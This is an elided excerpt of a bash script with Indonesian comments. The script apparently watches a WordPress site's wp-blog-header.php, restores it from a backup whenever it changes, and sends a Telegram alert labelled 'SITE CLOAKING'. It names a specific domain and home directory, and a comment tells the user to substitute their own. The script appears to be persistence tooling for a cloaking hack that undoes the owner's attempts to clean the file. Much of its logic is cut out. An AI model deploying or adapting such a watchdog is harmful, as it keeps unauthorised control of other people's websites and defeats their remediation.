...
INDEX_FILE=/home/shirinba/public_html/wp-blog-header.php"
# Definisikan lokasi folder backup Permissions 755
BACKUP_FOLDER="/home/shirinba/"
...
monitor_file() {
    while true; do
        ...
        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            ...
            echo "SITE CLOAKING."
            send_telegram_notification "https://shirin-bayan.com/ Di HAPUS. wp-blog-header.php Di kembalikan." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
        fi
